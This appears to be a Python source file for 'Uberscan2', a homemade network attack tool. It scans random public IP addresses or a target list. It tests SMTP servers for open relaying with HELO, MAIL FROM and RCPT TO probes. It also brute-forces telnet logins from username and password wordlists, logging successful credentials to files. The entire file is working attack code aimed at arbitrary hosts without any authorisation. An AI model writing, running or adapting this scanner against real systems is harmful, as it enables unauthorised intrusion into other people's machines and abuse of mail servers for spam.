#!/usr/bin/python3
#************************** PrintUsage *****************************

def PrintUsage():
	print ("\n\n")
	print ("\t\t\tUBERSCAN2")
	print ("\t\tThe python version of Uberscan!!")
	print ("")
	print ("\t\t Copyright (c) 2024 Batch McNulty")
	print ("")
	#print ("uberscan2 -blah -blahblah: 1234")
	print ("-timeout: nn	Timeout value in seconds (duh)")
	print ("-port: nn		where nn = port number (ie, 25)")
	print ("-hack: smtphelo		Auto test numbers in ipnumbers.txt again smtp HELO command")
	print ("-hack: smtphack		Try the SMTP hack")
	print ("-hack: telnet		Try to hack telnet")
	print ("-keepfound		Keep servers found even if we couldn't hack them (Only works with -hack: telnet)")
	print ("-ipnumber: nn.nn.nn.nn	Use nn.nn.nn.nn as the target address, single-crack stylee (UNDER CONSTRUCTION")
	print ("-ipfile: blah.txt	Use file blah.txt for ips" )
	print ("-successfile: blah.txt	use file blah.txt to output successful hax!")
	print ("-foundfile: blah.txt	use file blah.txt to output found IPs (implies -keepfound)")
	print ("")
	print ("NB: Default behaviour is to try random ip addresses with a timeout of 1 second")
	print ("\n\n")






#************************ Hacksmtp_helo *************************
def Hacksmtp_helo (serverHost, serverPort, timeout):
		
	import sys
	import time
#	uname_n_pwd = [username,password]
	#sockobj= socket(AF_INET, SOCK_STREAM)
	try:
		sockobj= socket(AF_INET, SOCK_STREAM)
		sockobj.settimeout(timeout)
	except:
		print ("*** COULDN'T START STREAM, BAD IP?")
		return ("BADIP")
	#sockobj= (AF_INET, SOCK_STREAM)
	data = ""
	try:
		sockobj.connect((serverHost, serverPort))
		data = sockobj.recv(1024)
	#except socket.timeout:
	#	print ("*** CONNECTION TIMED OUT ***")
	#	return ("BADIP")	
	except:
		print ("*** COULDN'T CONNECT, SUCKY IP ADDRESS ***")
		return ("BADIP")
	print ("*******************************************")
	print ("First reply from",serverHost, repr(data))
	print ("First reply (raw):",data)
	print ("*******************************************")
	if (repr(data) == "b''"):
		print (" *** SOME BULLSHIT, SKIPPING ***")
		return ("BADIP")
	
	#print (hack, uname_n_pwd[hack])
	sockno = sockobj
	print ("sockno:",sockno)

	print ("sending HELO...")
	sockobj.send ("HELO".encode('ascii')+b"\n")
	data = sockobj.recv(1024)
	print ("from",serverHost, repr(data))
	print ("Decd",serverHost, data.decode())
	#print ("Attempt to get inside repr(data):")
	#print (data (socket))
	result = repr(data)
	openhandles = sockobj.close()
	print ("openhandles:",openhandles)
	sockno = sockobj
	print ("sockno:",sockno)
	#print ("Dec\'d:",sockno.decode())
	#sockobj.shutdown(openhandles)
	time.sleep (1)
	if (result.find('452 syntax error (connecting)') > -1):
		print ("Syntax error error message.")
		return (False)
	else:
		print ("***********MAYBE!!*********")
		return (True)


























#************************ Hacksmtp *************************
def Hacksmtp (serverHost, serverPort, timeout):
		
	import sys
	import time

	print ("host:",serverHost,"port:",serverPort,"timeout:",timeout)
	
	#time.sleep(1)
#	uname_n_pwd = [username,password]
	#sockobj= socket(AF_INET, SOCK_STREAM)
	try:
		sockobj= socket(AF_INET, SOCK_STREAM)
		sockobj.settimeout(timeout)
	except:
		print ("*** COULDN'T START STREAM, BAD IP?")
		return ("BADIP")
	#sockobj= (AF_INET, SOCK_STREAM)
	data = ""
	try:
		sockobj.connect((serverHost, serverPort))
		data = sockobj.recv(1024)
	#except socket.timeout:
	#	print ("*** CONNECTION TIMED OUT ***")
	#	return ("BADIP")	
	except:
		print ("*** COULDN'T CONNECT, SUCKY IP ADDRESS ***")
		return ("BADIP")
	print ("*******************************************")
	print ("First reply from",serverHost, repr(data))
	print ("First reply (raw):",data)
	print ("*******************************************")
	if (repr(data) == "b''"):
		print (" *** SOME BULLSHIT, SKIPPING ***")
		return ("BADIP")
	
	#print (hack, uname_n_pwd[hack])
	sockno = sockobj
	print ("sockno:",sockno)

	print ("sending HELO...")
	try:
		sockobj.send ("HELO localhost".encode('ascii')+b"\n")
		data = sockobj.recv(1024)
	except:
		print ("TIMED OUT, Returning False at HELO")
		return (False)
	print ("from",serverHost, repr(data))
	print ("Decd",serverHost, data.decode())
	#print ("Attempt to get inside repr(data):")
	#print (data (socket))
	result = repr(data)
	if (result.find('452 syntax error (connecting)') > -1):
		print ("Syntax error error message.")
		return (False)

	print ("sending MAIL FROM:...")

	try:
		sockobj.send("MAIL FROM: localhost".encode('ascii')+b"\n")
		data = sockobj.recv(1024)
	except:
		print ("TIMED OUT, Returning False at MAIL FROM")
		return (False)
	print ("from",serverHost, repr(data))
	print ("Decd",serverHost, data.decode())
	#print ("Attempt to get inside repr(data):")
	#print (data (socket))
	result = repr(data)

	print ("sending RCPT TO:...")
	try:
		sockobj.send("RCPT TO: localhost".encode('ascii')+b"\n")
		data = sockobj.recv(1024)
	except:
		print ("TIMED OUT, returning False at RCPT TO")
		return (False)
	#data = sockobj.recv(1024)

	print ("from",serverHost, repr(data))
	print ("Decd",serverHost, data.decode())
	#print ("Attempt to get inside repr(data):")
	#print (data (socket))
	result = repr(data)

	openhandles = sockobj.close()
	print ("openhandles:",openhandles)
	sockno = sockobj
	print ("sockno:",sockno)
	#print ("Dec\'d:",sockno.decode())
	#sockobj.shutdown(openhandles)
	time.sleep (timeout)
	if (result.find("250") > -1):
		print ("**** MAYBE ON HACKSMTP()! ****")
		return (True)
	if (result.find("251") > -1):
		print ("**** MAYBE ON HACKSMTP()! ****")
		return (True)
	if (result.find("354") > -1):
		print ("**** MAYBE ON HACKSMTP()! ****")
		return (True)
	else:
		print ("**** LOOKS BAD ON HACKSMTP()! ***!")
		return (False)
























# *********************** DumpData **********************************

def DumpData(serverHost,serverPort, username, password, timeout, data):
	dumpfile = "dump.txt"
	print ("**** Emergency dump from IP:",ipnumber,"\n port:",port,"username tried was",username, "password tried was", password,"timeout was", timeout,"data encountered was", data, "****")
	dumphandle = open(dumpfile, "a")
	print ("\n ************** Emergency dump ****************\n\n from IP:",ipnumber,"\n port:",port,"\n username tried was",username, "\n password tried was", password,"\n timeout was", timeout,"\ndata encountered was(newline is mine):\n", data, "\n*************************** END OF DATA *************************\n\n\n\n\n", file = dumphandle)
	dumphandle.close()

#************************ HackTelnet *************************
def HackTelnet (serverHost, serverPort, username, password, timeout):
		
	import sys
	import time
	uname_n_pwd = [username,password]
	try:
		sockobj= socket(AF_INET, SOCK_STREAM)
		sockobj.settimeout(timeout)	
	except:
		print ("*** COULDN'T START STREAM, BAD IP?")
		return ("BADIP")
	data = ""

	#sockobj.connect((serverHost, serverPort))
	#data = sockobj.recv(1024)
	
	try:
		sockobj.connect((serverHost, serverPort))
		data = sockobj.recv(1024)
	except:
		print ("*** COULDN'T CONNECT TO TELNET HOST, SUCKY IP ADDRESS ***")
		return ("BADIP")
	
	print ("*******************************************")
	print ("First reply from",serverHost, repr(data))
	print ("First reply (raw):",data)
	print ("*******************************************")
	if (repr(data) == "b''"):
		print (" *** SOME BULLSHIT, SKIPPING ***")
		openhandles = sockobj.close()
		print ("openhandles:",openhandles)
		time.sleep(1)
		return ("BADIP")
	
	
	for hack in range (0,2):
		print ("*********** HACKLOOP BEGINS. Have looped:",hack,"times ********")
		print (hack, uname_n_pwd[hack])
		sockno = sockobj
		print ("sockno:",sockno)

		result = repr(data)
		looptimes = 0
		####### Wait till we have what looks like a prompt (the string ":") (not the quotations marks dummy) #######
		while (result.find(':') < 0):
			try:
				data = sockobj.recv(1024)
			except:
				print ("Couldn't get data after handshake negotiated. Dumping and quitting...")
				DumpData(serverHost,serverPort, username, password, timeout, data)
				print ("IP: ",serverHost, ":",serverPort)
				return ("BADIP")

			result = repr(data)
			looptimes += 1
			print ("FROM ",serverHost, ":",result)
			if (looptimes > 10):
				print ("Something has gone wrong. Dumping data to file and quitting")
				DumpData(serverHost,serverPort, username, password, timeout, data)
				print ("IP: ",serverHost, ":",serverPort)
				return ("BADIP")

		print ("sending",uname_n_pwd[hack])
		try:
			sockobj.send (uname_n_pwd[hack].encode('ascii')+b"\n")			
		except:
			print ("Couldn't send (timeout?), dumping data....")
			DumpData(serverHost,serverPort, username, password, timeout, data)
			return ("BADIP")

		try:
			data = sockobj.recv(1024)
		except:
			print ("There's something there but I can't get to it. (timeout?) Keep this IP for later.")
			DumpData(serverHost,serverPort, username, password, timeout, data)
			return ("BADIP")

		result = repr(data)
		print ("RECV'd:",result)
		'''
		print ("from",serverHost, repr(data))
		try:
			print ("Decd",serverHost, data.decode())
		except:
			print ("Can't decode, this is bad!")
		'''
		#print ("Attempt to get inside repr(data):")
		#print (data (socket))
		
	try:
		data = sockobj.recv(1024)
	except:
		print ("Couldn't recv, dumping data....")
		#print ("There's something there but I can't get to it. Keep this IP for later.")
		DumpData(serverHost,serverPort, username, password, timeout, data)
		return ("BADIP")
		
	result = repr(data)
	openhandles = sockobj.close()
	print ("openhandles:",openhandles)
	sockno = sockobj
	print ("sockno:",sockno)
	print ("FINAL RECVD DATA:",result)
	#print ("Dec\'d:",sockno.decode())
	#sockobj.shutdown(openhandles)
	time.sleep (1)
	if (result.find('ailed') > -1):
		print ("WRONG USERNAME OR PASSWORD (telnet found a \"nvalid\" error message)")
		return (False)

	if (result.find('nvalid') > -1):
		print ("WRONG USERNAME OR PASSWORD (telnet found a \"nvalid\" error message)")
		return (False)

	elif (result.find('ailure') > -1):
		print ("WRONG USERNAME OR PASSWORD (telnet found a \"ailure\" error message)")
		return (False)

	elif (result.find('ogin:') > -1):
		print ("WRONG USERNAME OR PASSWORD (telnet found a \"ogin:\" prompt)")
		return (False)

	elif (result.find('sername:') > -1):
		print ("WRONG USERNAME OR PASSWORD (telnet found a \"sername:\" prompt)")
		return (False)

	elif (result.find('ad name or password') > -1):
		print ("WRONG USERNAME OR PASSWORD (telnet found a \"ad name or password\" error message)")
		return (False)

	elif (result.find('incorrect') > -1):
		print ("WRONG USERNAME OR PASSWORD (telnet found an (\"incorrect\" error message)")
		return (False)	
	else:
		print ("***********MAYBE (telnet)!!*********")
		return (True)












	
#*********************** WRITEFOUNDFILE ************************

def WriteFoundFile(foundfile, ipnumber, port, username, password):
	#foundfile = "found.txt"
	print ("**** found host on:",ipnumber, port,username, password, "****")
	foundhandle = open(foundfile, "a")
	print (ipnumber, port,username, password, file = foundhandle)
	foundhandle.close()






	
#*********************** WRITESUCCESSFILE ************************

def WriteSuccessFile(successfile, ipnumber, port, username, password):
	#successfile = "success.txt"
	print ("**** Success on:",ipnumber, port,username, password, "****")
	handle = open(successfile, "a")
	print (ipnumber, port,username, password, file = handle)
	handle.close()
	






############################# GETOPTION #########################
def GetOption(option):
	try:
		optno = sys.argv.index(option)+1
		actualoption = str(sys.argv[optno])
		print (option,":",actualoption)
		return (actualoption)
	except:
		print ("No option found for option",option)
		return (False)








############################# GETSINGLEOPTION #########################
def GetSingleOption(option):
	try:
		optno = sys.argv.index(option)
		actualoption = str(sys.argv[optno])
		print (option,":",actualoption)
		return (actualoption)
	except:
		print ("No option found for option",option)
		return (False)








######################### GETRANDOMIP ##############################
def GetRandomIP():
	import random 
	first_octet = 127
	first_n_second = "192.168"
	while (first_octet == 127 or first_n_second == "192.168"):
		first_octet = random.randint(0,256)
		second_octet = random.randint(0,256)
		third_octet = random.randint(0,256)
		fourth_octet = random.randint(0,256)
		first_n_second = str(first_octet)+"."+str(second_octet)
	ipnumber = str(first_octet)+"."+str(second_octet)+"."+str(third_octet)+"."+str(fourth_octet)
	print ("random ipnumber is:",ipnumber)
	return(ipnumber)






 
#*************************** MAIN ***********************


#********************************************************
from socket import *
import os
import sys

single_crack = False
ip_number = GetOption("-ipnumber:")
if (ip_number != False):
	single_crack = True

timeout = int (GetOption("-timeout:"))
if (timeout == False):
	timeout = 1
print ("Timeout:",timeout)

keepfound = GetSingleOption("-keepfound")

foundfile = GetOption ("-foundfile:")
if (foundfile == False):
	foundfile = "found.txt"
else:
	keepfound = "-keepfound"
	
ipfile = GetOption ("-ipfile:")

userfile = "usernames.txt"
pwdfile = "passwords.txt"

port = "0"

port = int (GetOption("-port:"))
hack = GetOption("-hack:")

successfile = GetOption ("-successfile:")
if (successfile == False):
	successfile = "success.txt"


if (port == False):
	if (hack == "smtphack"):
		port = 25
	if (hack == "smtphelo"):
		port = 25
	if (hack == "telnet"):
		port = 23

if (hack == False):
	if (port == False):
		print ("Can't do anyting, try specifying a port or a hack or both")
		PrintUsage()
		quit()
	else:
		if (port == "23"):
			hack == "telnet"


print ("Port:",port)
print ("hack:",hack)
	
#quit()
print ("ipfile:",ipfile)


if (ipfile != False):
	with open (ipfile, 'r') as file:
		ipnumbers = file.read()
else:
	if (ip_number == False):
		ipnumbers = "Ignore this\n it's a dummy so we can get \n random ips from a subroutine\n\n\n"
if (single_crack == True): 
	ipnumbers = ip_number+"\n\n"


print (ipnumbers)
print (len(ipnumbers))
ipnumbers = ipnumbers.strip()
ipnumbers_array = str.split(ipnumbers,"\n")
print (ipnumbers_array)

with open (userfile, 'r') as file:
	usernames = file.read()
usernames = usernames.strip()
usernames_array = str.split(usernames, "\n")

with open (pwdfile, 'r') as file:
	passwords = file.read()
passwords = passwords.strip()
passwords_array = str.split(passwords, "\n")


print (usernames_array)
print (passwords_array)
#port = str(port)
print ("port is",port)
print ("port is of type",type(port))

ip = 0

#quit()

############################ smtp hack ################################

if hack == "smtphack":
	while (ip < len(ipnumbers_array)): 
		if (ipfile == False and single_crack == False):
			ip = 0
			ipnumber = GetRandomIP()
		else:
			ipnumber = ipnumbers_array[ip]
		print ("hack = ",hack,"ip:",ip, "keepfound:",keepfound, "foundfile:",foundfile, "successfile:",successfile)
		print ("ipnumber:",ipnumber, "port:",port,"timeout",timeout)
		reality= Hacksmtp(ipnumber, port, timeout)
		if (reality == True):
			WriteFoundFile(foundfile, ipnumber, port, "n/a", "n/a")
			WriteSuccessFile(successfile, ipnumber, port, "n/a", "n/a")
		else:
			print ("No hacksmtp today!")
			if (reality == False):
				if (keepfound == "-keepfound"):
					WriteFoundFile(foundfile, ipnumber, port, "n/a", "n/a")

		ip += 1
					
	print ("Bye bye, smtp hacking finished")
	quit()

############################## smtp helo #######################

if hack == "smtphelo":

	while (ip < len(ipnumbers_array)): 
		if (ipfile == False and single_crack == False):
			ip = 0
			ipnumber = GetRandomIP()
		else:
			ipnumber = ipnumbers_array[ip]

		print ("hack = ",hack,"ip:",ip, "keepfound:",keepfound, "foundfile:",foundfile, "successfile:",successfile)
		print ("ipnumber:",ipnumber, "port:",port,"timeout",timeout)

		reality= Hacksmtp_helo(ipnumber, port, timeout)

		if (reality == True):
			WriteSuccessFile(successfile, ipnumber, port, "n/a", "n/a")
		else:
			print ("No HELO today!")
		
		ip += 1

	print ("Bye bye, smtp helo hacking finished")
	quit()

############################ Telnet scanning (add others as needed) ####################################
if (hack == "telnet"):

	while (ip < len(ipnumbers_array)): 
		if (ipfile == False and single_crack == False):
			ip = 0
			ipnumber = GetRandomIP()
		else:
			ipnumber = ipnumbers_array[ip]
		
		print ("hack = ",hack,"ip:",ip, "keepfound:",keepfound, "foundfile:",foundfile, "successfile:",successfile)
		print ("ipnumber:",ipnumber, "port:",port,"timeout",timeout)
		for user in range (0, len(usernames_array)):
			username = usernames_array[user]
			for pwd in range (0, len(passwords_array)):
				password = passwords_array[pwd]

				print ("Trying ",ipnumber,":",port, "Username:", username, "Password:",password)		
				
				reality = HackTelnet (ipnumber, port, username, password, timeout)
				if (reality == True):
					WriteSuccessFile(successfile, ipnumber, port, username, password)
					if (keepfound == "-keepfound"):
						WriteFoundFile(foundfile, ipnumber, port, username, password)
				if (reality == False):
					print ("SORRY, NO FISH TODAY!")
					if (keepfound == "-keepfound"):
						WriteFoundFile(foundfile, ipnumber, port, username, password)
				if (reality == "BADIP"):
					print ("BAD IP ADDRESS, skipping...")
					print ("index:",ip)
					#del (ipnumbers_array[ip])
					break
			if (reality == "BADIP"):	break
		# DANGER - ABOVE LINE (break) may cause and INFINITE LOOP
		ip += 1

		#if (reality == "BADIP"):	break		
		
print ("It's all over!")
